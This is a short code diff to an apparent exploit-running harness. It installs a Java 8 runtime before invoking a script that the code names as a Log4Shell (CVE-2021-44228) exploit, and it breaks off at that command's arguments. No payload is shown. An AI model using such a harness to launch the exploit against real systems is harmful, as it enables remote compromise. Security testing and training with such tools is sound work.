@@ -342,6 +342,13 @@ class Trainman:
         else:
             output = {'outcome': 'failed', 'message': 'Missing exec_cmd', 'forward_log': 'False'}
             return output
+        env = {}
+        env.update(os.environ)
+        jvm_install_cmd = ['/root/.jabba/bin/jabba', 'install', 'adopt@1.8.0-292']
+        subprocess.Popen(
+            jvm_install_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env
+        )
+        env['PATH'] = env['PATH'] + f':/root/.jabba/jdk/adopt@1.8.0-292/bin'
         exploit_cve_2021_44228_cmd = [
             'python3',
             '/L4sh/main.py',
